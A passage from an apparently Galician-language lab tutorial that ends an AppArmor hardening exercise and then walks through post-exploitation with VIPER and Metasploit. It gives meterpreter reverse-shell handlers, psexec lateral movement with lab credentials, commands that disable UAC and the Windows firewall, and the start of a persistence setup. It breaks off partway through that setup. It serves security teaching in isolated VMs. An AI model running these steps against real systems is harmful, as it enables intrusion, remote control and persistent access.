</span><span id="__span-56-19"><a id="__codelineno-56-19" name="__codelineno-56-19" href="#__codelineno-56-19"></a><span class="w">  </span><span class="nb">deny</span><span class="w"> </span><span class="sx">/tmp/**</span><span class="w"> </span>mx,
</span><span id="__span-56-20"><a id="__codelineno-56-20" name="__codelineno-56-20" href="#__codelineno-56-20"></a><span class="w">  </span><span class="nb">deny</span><span class="w"> </span><span class="sx">/var/tmp/**</span><span class="w"> </span>mx,
</span><span id="__span-56-21"><a id="__codelineno-56-21" name="__codelineno-56-21" href="#__codelineno-56-21"></a>
</span><span id="__span-56-22"><a id="__codelineno-56-22" name="__codelineno-56-22" href="#__codelineno-56-22"></a><span class="c"># --- Denegar execución en directorios home ---</span>
</span><span id="__span-56-23"><a id="__codelineno-56-23" name="__codelineno-56-23" href="#__codelineno-56-23"></a><span class="c"># !!! danger &quot;Restrinxir /home é Arriscado&quot;</span>
</span><span id="__span-56-24"><a id="__codelineno-56-24" name="__codelineno-56-24" href="#__codelineno-56-24"></a><span class="c">#     Descomentar estas liñas pode romper aplicacións lexítimas (instaladores,</span>
</span><span id="__span-56-25"><a id="__codelineno-56-25" name="__codelineno-56-25" href="#__codelineno-56-25"></a><span class="c">#     scripts de usuario, etc.). PROBA EXTENSIVAMENTE en modo complain.</span>
</span><span id="__span-56-26"><a id="__codelineno-56-26" name="__codelineno-56-26" href="#__codelineno-56-26"></a><span class="c">#     Considere mellor restrinxir aplicacións específicas (navegador, correo).</span>
</span><span id="__span-56-27"><a id="__codelineno-56-27" name="__codelineno-56-27" href="#__codelineno-56-27"></a><span class="c"># deny @{HOME}/** mx,</span>
</span><span id="__span-56-28"><a id="__codelineno-56-28" name="__codelineno-56-28" href="#__codelineno-56-28"></a><span class="c"># deny /home/*/** mx, # Alternativa se @{HOME} non funciona como esperado</span>
</span><span id="__span-56-29"><a id="__codelineno-56-29" name="__codelineno-56-29" href="#__codelineno-56-29"></a>
</span><span id="__span-56-30"><a id="__codelineno-56-30" name="__codelineno-56-30" href="#__codelineno-56-30"></a><span class="c"># Permitir outras operacións pode ser necesario se o perfil fose máis complexo,</span>
</span><span id="__span-56-31"><a id="__codelineno-56-31" name="__codelineno-56-31" href="#__codelineno-56-31"></a><span class="c"># pero para un &#39;deny&#39; explícito, non son estrictamente obrigatorias.</span>
</span><span id="__span-56-32"><a id="__codelineno-56-32" name="__codelineno-56-32" href="#__codelineno-56-32"></a><span class="err">}</span>
</span></code></pre></div>
<ul>
<li><strong>Explicación:</strong><ul>
<li><code>deny ... mx,</code>: Bloquea tanto a execución directa como a carga indirecta de código executáble para todos os ficheiros (<code>**</code>) dentro dos directorios especificados (<code>/tmp/</code>, <code>/var/tmp/</code>).</li>
<li>A sección para <code>@{HOME}</code> está comentada por precaución.</li>
</ul>
</li>
</ul>
<p>d. Gardar e Pechar</p>
<p>En <code>nano</code>, preme <code>Ctrl+O</code>, <code>Enter</code>, e logo <code>Ctrl+X</code>.</p>
<p>e. Cargar o Perfil en Modo <em>Complain</em></p>
<div class="admonition warning">
<p class="admonition-title">Probar Primeiro en Modo <em>Complain</em></p>
<p>É <strong>crucial</strong> cargar primeiro o perfil en modo <em>complain</em> (queixarse). Neste modo, AppArmor <strong>rexistra</strong> as violacións das regras pero <strong>non as bloquea</strong>. Isto permíteche ver se o perfil interfire con operacións lexítimas do sistema antes de aplicalo de forma estrita.</p>
</div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="c1"># Cargar/Recargar o perfil no kernel e escribir na caché</span>
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>apparmor_parser<span class="w"> </span>-r<span class="w"> </span>-W<span class="w"> </span>/etc/apparmor.d/local.deny-execute-unsafe-paths
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="c1"># Poñer o perfil específico en modo complain</span>
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a>aa-complain<span class="w"> </span>local.deny-execute-unsafe-paths
</span></code></pre></div>
<em>Asegúrate de que <code>local.deny-execute-unsafe-paths</code> coincide co nome usado dentro do ficheiro de perfil.</em></p>
<p>f. Realizar Probas</p>
<ol>
<li>Crea un script simple ou copia un executable pequeno a <code>/tmp</code>.
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;#!/bin/bash\necho &quot;Ola desde /tmp!&quot;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/test_script.sh
</span></code></pre></div></li>
<li>Dálle permisos de execución:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/test_script.sh
</span></code></pre></div></li>
<li>Intenta executalo:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>/tmp/test_script.sh
</span></code></pre></div></li>
<li>
<p><strong>Revisa os Logs de AppArmor:</strong> Mentres o perfil está en modo <em>complain</em>, a execución debería funcionar, pero deberías ver mensaxes de violación nos logs do sistema indicando que AppArmor <em>tería</em> bloqueado a acción.
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c1"># Busca mensaxes de AppArmor nos logs do sistema</span>
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>journalctl<span class="w"> </span>-f<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;apparmor=&quot;DENIED&quot;|apparmor=&quot;ALLOWED&quot; operation=&quot;exec&quot;&#39;</span>
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="c1"># Tamén podes revisar /var/log/audit/audit.log ou /var/log/syslog</span>
</span></code></pre></div>
    Busca entradas relacionadas co perfil <code>local.deny-execute-unsafe-paths</code> e a operación de execución (<code>operation="exec"</code>, <code>permission="execute"</code>) sobre o teu script en <code>/tmp</code>.</p>
<div class="admonition tip">
<p class="admonition-title">journalctl non amosa nada pero audit.log si, por que?</p>
<p>É unha situación moi habitual e a razón principal adoita ser a forma en que <code>auditd</code> e <code>journald</code> interactúan co subsistema de auditoría do kernel:</p>
<ol>
<li>
<p><strong>AppArmor Xera Eventos de Auditoría do Kernel:</strong> Cando AppArmor toma unha decisión (PERMITIR/DENEGAR), non escribe directamente nun ficheiro de log. En cambio, xera un evento a través do <strong>subsistema de auditoría do kernel</strong> de Linux (o mesmo que usa <code>auditd</code> para monitorizar chamadas ao sistema).</p>
</li>
<li>
<p><strong><code>auditd</code> é o Consumidor Principal (se está activo):</strong> O daemon <code>auditd</code> está deseñado especificamente para escoitar e rexistrar estes eventos de auditoría do kernel. Cando <code>auditd</code> está instalado, activo e configurado correctamente (o cal é o caso por defecto cando o instalas), convértese no <strong>receptor principal e moitas veces exclusivo</strong> destes eventos. Leos directamente do kernel e escríbeos no seu propio ficheiro de log: <code>/var/log/audit/audit.log</code>.</p>
</li>
<li>
<p><strong><code>journald</code> e os Eventos de Auditoría:</strong> O daemon <code>journald</code> (o backend de <code>journalctl</code>) tamén recolle mensaxes do kernel (a través de <code>printk</code>/<code>/dev/kmsg</code>). <em>En teoría</em>, podería ver os eventos de auditoría que AppArmor xera. Porén:</p>
<ul>
<li><strong>Preferencia de <code>auditd</code>:</strong> O sistema está deseñado para que, se <code>auditd</code> está activo, el teña prioridade para procesar os eventos de auditoría. Nalgúns casos, o kernel pode enviar os eventos <em>só</em> a <code>auditd</code> cando está configurado como o sistema de auditoría activo, e non os duplica ao fluxo normal de mensaxes do kernel (<code>printk</code>) do que le <code>journald</code>.</li>
<li><strong>Configuración de <code>auditd</code>:</strong> A configuración de <code>auditd</code> (<code>/etc/audit/auditd.conf</code>) e as regras cargadas (<code>auditctl</code>) poden influír en como se manexan os eventos. Se <code>auditd</code> está en modo "inmutable" (<code>auditctl -e 2</code>) ou simplemente activo (<code>auditctl -e 1</code>), o kernel entende que <code>auditd</code> é o destino principal.</li>
<li><strong>Posible Filtrado en <code>journald</code> (Menos probable):</strong> Aínda que <code>journald</code> vise os eventos, podería haber regras de filtrado ou rate-limiting (aínda que é menos común para eventos de seguridade como os de AppArmor).</li>
</ul>
</li>
<li>
<p><strong>O Comando <code>grep</code>:</strong> O teu comando <code>grep</code> para <code>journalctl</code> (<code>grep -E 'apparmor="DENIED"|apparmor="ALLOWED" operation="exec"'</code>) busca cadeas específicas que aparecen <em>dentro</em> do rexistro de auditoría. Se <code>journald</code> non está recibindo eses rexistros en primeiro lugar, o <code>grep</code> non atopará nada. O formato en <code>/var/log/audit/audit.log</code> é o formato nativo de auditoría, que contén esas cadeas exactas.</p>
</li>
</ol>
<p><strong>En Resumo:</strong></p>
<p>A razón máis probable pola que ves os logs de AppArmor en <code>/var/log/audit/audit.log</code> pero non con <code>journalctl</code> é porque <strong><code>auditd</code> está activo e está interceptando/consumindo os eventos de auditoría do kernel directamente</strong>, antes ou en lugar de que cheguen ao fluxo de mensaxes do kernel que <code>journald</code> monitoriza.</p>
<p><strong>Que facer?</strong></p>
<ul>
<li><strong>Confía en <code>auditd</code> para os logs de AppArmor:</strong> Cando <code>auditd</code> está activo, a forma estándar e máis fiable de ver os eventos de AppArmor (e outros eventos de auditoría) é usar as ferramentas de <code>auditd</code>:<ul>
<li><code>ausearch -m avc -ts recent</code> (Busca eventos específicos de AppArmor/SELinux recentes)</li>
<li><code>ausearch -m apparmor -ts recent</code> (Se o teu sistema etiqueta especificamente AppArmor)</li>
<li><code>tail -f /var/log/audit/audit.log | grep -i apparmor</code> (Monitoriza o ficheiro directamente)</li>
</ul>
</li>
<li><strong>Verifica o estado de <code>auditd</code>:</strong>
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>systemctl<span class="w"> </span>status<span class="w"> </span>auditd
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>auditctl<span class="w"> </span>-s<span class="w"> </span><span class="c1"># Mira se &#39;enabled&#39; é 1 ou 2</span>
</span></code></pre></div></li>
<li><strong>Se <em>realmente</em> queres os logs en <code>journald</code>:</strong> Poderías deter ou desactivar <code>auditd</code> (<code>systemctl stop auditd &amp;&amp; systemctl disable auditd</code>). Nese caso, os eventos de auditoría do kernel deberían empezar a aparecer en <code>journalctl</code> (xa que non habería un consumidor principal interceptándoos). <em>Non obstante, isto desactiva todo o sistema de auditoría de <code>auditd</code>, o cal non adoita ser recomendable por razóns de seguridade.</em> Unha alternativa sería configurar <code>audispd-plugins</code> (como <code>audisp-remote</code> ou outros) para reenviar eventos desde <code>auditd</code> a outros sistemas, ou configurar <code>rsyslog</code> para ler o ficheiro <code>audit.log</code>, pero iso complica a configuración.</li>
</ul>
</div>
</li>
</ol>
<p>g. Activar o Modo <em>Enforce</em></p>
<p>Se as probas en modo <em>complain</em> foron satisfactorias e non detectaches o bloqueo de procesos lexítimos, podes activar o modo <em>enforce</em> (forzar):</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>aa-enforce<span class="w"> </span>local.deny-execute-unsafe-paths
</span></code></pre></div>
<p>Agora, calquera intento de executar un ficheiro directamente desde <code>/tmp</code> ou <code>/var/tmp</code> debería fallar cun erro de "Permission denied".</p>
<div class="admonition tip">
<p class="admonition-title">Limitacións e Consideracións</p>
<ul>
<li><strong>Intérpretes vs. Binarios:</strong> Este perfil bloquea a execución <em>directa</em> (<code>./meu_script</code>), pero non necesariamente a execución a través dun intérprete permitido (<code>bash /tmp/meu_script.sh</code>). Para iso, necesitarías perfís máis específicos para os intérpretes.</li>
<li><strong>Complexidade con <code>/home</code>:</strong> Bloquear a execución no directorio <code>home</code> é complexo e pode romper funcionalidades. É xeralmente mellor restrinxir aplicacións individuais (como navegadores) que poidan descargar e tentar executar payloads.</li>
<li><strong>Combinación de Defensas:</strong> AppArmor é unha capa de seguridade. Combínaa con permisos de ficheiros adecuados, opcións de montaxe de sistemas de ficheiros como <code>noexec</code> onde sexa aplicable, e outras boas prácticas de seguridade.</li>
</ul>
</div>
<hr />
<h3 id="exemplo-2-movemento-lateral-expandir-acceso"><strong>Exemplo 2: Movemento Lateral (Expandir Acceso)</strong></h3>
<div class="admonition warning">
<p class="admonition-title"><strong>Prerrequisito: Facer Exemplo1</strong></p>
</div>
<div class="admonition note">
<p class="admonition-title">Arquitectura do Escenario de Movemento Lateral</p>
<p><img 70_="70%" alt="viper - Exemplo2" src="../images/viper-exemplo2.png" /></p>
<p><em>Asumimos que o atacante xa comprometeu <code>VM-2</code> (ver Exemplo 1) e agora quere acceder a outros sistemas (VM-3) na mesma rede interna.</em></p>
</div>
<!--
    <div style="text-align: center;">
    <pre class="mermaid"><code>graph TD;
    A["VIPER Server (C2)&lt;br&gt;VM-1"] --&gt;|Comando e Control| B["VM-2"];
    B --&gt;|Movemento Lateral| C["VM-3"];
    C --&gt;|Exfiltración de Datos| A;


style A fill:yellow,stroke:#333,stroke-width:2px;
style B fill:red,stroke:#333,stroke-width:2px;
style C fill:violet,stroke:#333,stroke-width:2px;</code></pre>
    </div>
-->

<h4 id="escenario-resumido_1"><strong>Escenario Resumido</strong></h4>
<ul>
<li><strong><code>VM-1</code> (VIPER)</strong>: <code>192.168.120.100</code> (Centro de control, onde está VIPER con <code>msfconsole</code>).</li>
<li><strong><code>VM-2</code> (Debian con payload activo)</strong>: <code>192.168.120.101</code> (Acceso logrado dende <code>VM-1</code> a través dun <code>Meterpreter</code> activo).</li>
<li><strong><code>VM-3</code> (Windows 10 Enterprise Evaluation)</strong>: <code>192.168.120.102</code> (Portos abertos: <code>135</code>, <code>139</code>, <code>445</code>, con credenciais válidas <code>usuario/abc123</code>).</li>
</ul>
<h5 id="obxectivo-movemento-lateral-dende-vm-2-cara-vm-3"><strong>Obxectivo:</strong> Movemento lateral dende <code>VM-2</code> cara <code>VM-3</code>.</h5>
<h5 id="paso-1-acceso-a-vm-2-payload-activo"><strong>Paso 1: Acceso á <code>VM-2</code> (Payload activo)</strong></h5>
<h6 id="execucion-dende-vm-1-msfconsole-viper"><strong>Execución dende <code>VM-1</code> (msfconsole - VIPER)</strong></h6>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>use<span class="w"> </span>exploit/multi/handler
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>linux/x64/meterpreter/reverse_tcp
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>run
</span></code></pre></div>
<p><img alt="exploit mulit handler reverse_tcp 4444" src="../images/viper-msfconsole-444.png" /></p>
<h6 id="execucion-dende-vm-2-bash-linux"><strong>Execución dende <code>VM-2</code> (Bash - Linux)</strong></h6>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>./1743719330.elf<span class="w"> </span><span class="c1">#payload.elf</span>
</span></code></pre></div>
<p>Agora deberías ter acceso á <code>VM-2</code> a través de <code>meterpreter</code>.</p>
<p><img alt="exploit mulit handler reverse_tcp 4444 connected" src="../images/viper-msfconsole-444_2.png" /></p>
<hr />
<h5 id="paso-2-movemento-lateral-cara-vm-3"><strong>Paso 2: Movemento lateral cara <code>VM-3</code></strong></h5>
<div class="admonition tip">
<p class="admonition-title"><strong>Movemento Lateral vs. Pivoting</strong></p>
<ul>
<li><strong><code>Movemento Lateral</code></strong> é a técnica de moverse dun sistema a outro dentro da mesma rede comprometida sen utilizar ningún tipo de proxy ou túnel.</li>
<li><strong><code>Pivoting</code></strong> implica crear un proxy ou túnel para acceder a redes que non son directamente accesibles.</li>
</ul>
</div>
<p>Neste escenario, imos asumir que <code>VM-2</code> pode comunicarse directamente con <code>VM-3</code> a través da rede (<code>192.168.120.0/24</code>). Non se está utilizando <code>Pivoting</code>, só Movemento Lateral.</p>
<h6 id="escaneo-de-vm-3-dende-vm-2"><strong>Escaneo de <code>VM-3</code> dende <code>VM-2</code></strong></h6>
<div class="admonition tip">
<p class="admonition-title">Lembrar que estamos dentro dunha consola <code>meterpreter</code></p>
<p>De aí que ao rematar a enumeración executemos o comando <code>exit</code> para voltar á consola <code>mfsconsole</code></p>
</div>
<div class="admonition info">
<p class="admonition-title">De interese</p>
<p><a href="https://github.com/ricardofc/repoEDU-CCbySA/blob/main/SI/Pentester/ActiveDirectory/Enumeracion/Practica-SI-ActiveDirectory-Enumeracion.pdf" target="_blank">Enumeración - Practica-SI-ActiveDirectory-Enumeracion.pdf</a></p>
</div>
<ol>
<li>
<p>Comprobar conectividade e Enumerar sistema operativo mediante TTL (64→Linux, 128→Windows)
<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>ping<span class="w"> </span>-c2<span class="w"> </span><span class="m">192</span>.168.120.102<span class="w"> </span><span class="c1">#TTL&lt;=128 → Windows</span>
</span></code></pre></div></p>
</li>
<li>
<p>Enumerar portos TCP open
<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>nc<span class="w"> </span>-vz<span class="w"> </span><span class="m">192</span>.168.120.102<span class="w"> </span><span class="m">135</span><span class="w"> </span><span class="m">139</span><span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="c1">#Escaneo portos comúns</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="nb">exit</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="nb">exit</span>
</span></code></pre></div></p>
</li>
</ol>
<p><center><img alt="exploit mulit handler reverse_tcp 4444 connected ping nc" src="../images/viper-msfconsole-444_3.png" width="50%" /></center></p>
<h5 id="paso-3-movemento-lateral-con-psexec-smb"><strong>Paso 3: Movemento Lateral con <code>Psexec</code> (SMB)</strong></h5>
<div class="admonition warning">
<p class="admonition-title">Desactivar UAC e Firewall en Windows (modo laboratorio)</p>
<p>Para contornas de proba ou laboratorio, podes desactivar o UAC e o firewall de Windows Server ou Windows 10 cos seguintes comandos. <strong>Executa o terminal como administrador.</strong></p>
<p><strong>Desactivar UAC (User Account Control):</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLUA /t REG_DWORD /d 0 /f
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>shutdown /r /t 0
</span></code></pre></div>
<p>Isto modifica o rexistro para desactivar completamente o UAC. Requírese <strong>reinicio</strong>.</p>
<p><strong>Desactivar o firewall en todos os perfís (dominio, privado, público):</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>netsh advfirewall set allprofiles state off
</span></code></pre></div>
<p>Isto desactiva o firewall de Windows para todos os perfís. Útil para asegurar que nada bloquea <code>SMB</code>, <code>psexec</code>, ou conexións remotas.</p>
<hr />
<p><strong>Nota:</strong> Estes cambios reducen significativamente a seguridade do sistema. Úsaos só en contornas de laboratorio ou máquinas illadas.</p>
</div>
<h6 id="execucion-dende-vm-1-msfconsole-viper_1"><strong>Execución dende <code>VM-1</code> (msfconsole - VIPER)</strong></h6>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>use<span class="w"> </span>exploit/windows/smb/psexec
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.120.102
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="nb">set</span><span class="w"> </span>SMBUser<span class="w"> </span>usuario
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a><span class="nb">set</span><span class="w"> </span>SMBPass<span class="w"> </span>abc123.
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">5555</span>
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>run
</span></code></pre></div>
<p><img alt="Fig. 15: Movemento lateral - psexec" src="../images/psexec-movemento-lateral.png" /></p>
<h5 id="paso-4-verificar-acceso-a-vm-3"><strong>Paso 4: Verificar Acceso á <code>VM-3</code></strong></h5>
<h6 id="execucion-dende-vm-1-msfconsole-viper_2"><strong>Execución dende <code>VM-1</code> (msfconsole - VIPER)</strong></h6>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>background
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>sessions<span class="w"> </span>-l
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>sessions<span class="w"> </span>-i<span class="w"> </span>&lt;ID_da_sesión_de_VM-3&gt;
</span></code></pre></div>
<p>Podemos acceder tamén por interface gráfica de VIPER:  </p>
<p><center><img alt="exploit mulit handler reverse_tcp 4444 connected ping nc" src="../images/viper-msfconsole-444_4.png" width="50%" /></center></p>
<p><img alt="Fig. 16: Movemento lateral - psexec" src="../images/psexec-movemento-lateral-2.png" />
<img alt="Fig. 17: Movemento lateral - psexec" src="../images/psexec-movemento-lateral-3.png" />
<img alt="Fig. 18: Movemento lateral - psexec" src="../images/psexec-movemento-lateral-4.png" /></p>
<!--![Fig. 19: Movemento lateral - psexec](images/psexec-movemento-lateral-5.png)-->

<h3 id="exemplo-3-persistencia"><strong>Exemplo 3: Persistencia</strong></h3>
<div class="admonition warning">
<p class="admonition-title"><strong>Prerrequisito: Facer Exemplo1 e Exemplo2</strong></p>
</div>
<p>Imos establecer unha persistencia en Windows 10 tras obter unha sesión <code>meterpreter</code> con <code>psexec</code>. A persistencia permite reconexión automática tras reinicios mediante unha tarefa programada.</p>
<!--
<pre class="mermaid"><code>graph TD;
    subgraph VIPER ["VM-1: VIPER"]
        IP1["IP: 192.168.120.100"]
        A3["Xeración payload.exe"]
        A4["Xeración task.xml"]
        A1["Handler psexec&lt;br&gt;port 5555"]
        A2["Handler persistencia&lt;br&gt;port 6666"]
    end

    subgraph WINDOWS ["VM-3: Windows 10"]
        IP2["IP: 192.168.120.102"]
        B["Sesión meterpreter&lt;br&gt;via psexec"]
        C["Upload payload.exe&lt;br&gt;+ task.xml"]
        D["schtasks /create&lt;br&gt;importando task.xml"]
        E["Reboot + login"]
    end

    A3 --&gt; A1
    A4 --&gt; A1
    A1 --&gt;|psexec| B
    B --&gt;|upload| C
    C --&gt; D
    D --&gt; E
    E --&gt;|Reconexión| A2

    style IP1 fill:#ffffff,stroke:#333,stroke-width:1px
    style IP2 fill:#ffffff,stroke:#333,stroke-width:1px
    style A1 fill:yellow,stroke:#333,stroke-width:2px
    style A2 fill:lightgreen,stroke:#333,stroke-width:2px
    style A3 fill:lightblue,stroke:#333,stroke-width:1.5px
    style A4 fill:lightblue,stroke:#333,stroke-width:1.5px
    style B fill:orange,stroke:#333,stroke-width:2px
    style C fill:violet,stroke:#333,stroke-width:2px
    style D fill:#dda0dd,stroke:#333,stroke-width:2px
    style E fill:#f9f,stroke:#333,stroke-width:2px</code></pre>
-->

<p><img alt="viper - Exemplo3" src="../images/viper-exemplo3.png" /></p>
<h4 id="persistencia-en-windows-con-metasploit-tras-acceso-con-psexec">Persistencia en Windows con Metasploit tras acceso con psexec</h4>
<h5 id="paso-1-acceder-a-maquina-vitima-con-psexec">Paso 1: Acceder á máquina vítima con <code>psexec</code></h5>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>use<span class="w"> </span>exploit/windows/smb/psexec
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.120.102
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a><span class="nb">set</span><span class="w"> </span>SMBUser<span class="w"> </span>usuario
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="nb">set</span><span class="w"> </span>SMBPass<span class="w"> </span>abc123.
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">5555</span><span class="w">   </span>
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a>run
</span></code></pre></div>
<p><img alt="Fig. psexec" src="../images/persistencia1.png" /></p>
<h5 id="paso-2-poner-a-sesion-meterpreter-en-background">Paso 2: Poñer a sesión <code>meterpreter</code> en background</h5>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>background
</span></code></pre></div>
<p><img alt="Fig. background" src="../images/persistencia2.png" /></p>
<h5 id="paso-3-iniciar-un-multihandler-para-recibir-a-persistencia">Paso 3: Iniciar un <code>multi/handler</code> para recibir a persistencia</h5>
<p>Dende a lapela Msfconsole</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>use<span class="w"> </span>exploit/multi/handler
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">6666</span>
</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a><span class="nb">set</span><span class="w"> </span>ExitOnSession<span class="w"> </span><span class="nb">false</span>
</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a>run
</span></code></pre></div>
<p><img alt="Fig. multi/handler" src="../images/persistencia3.png" /></p>
<h5 id="paso-4-xerar-o-payload-para-persistencia">Paso 4: Xerar o payload para persistencia</h5>
<!--
![Fig. Generate Payload](images/payload0.png)
**   Crea un novo Payload que conecte co `multi/handler` do Paso 3: 
    *   Configura: `windows/meterpreter/reverse_tcp`
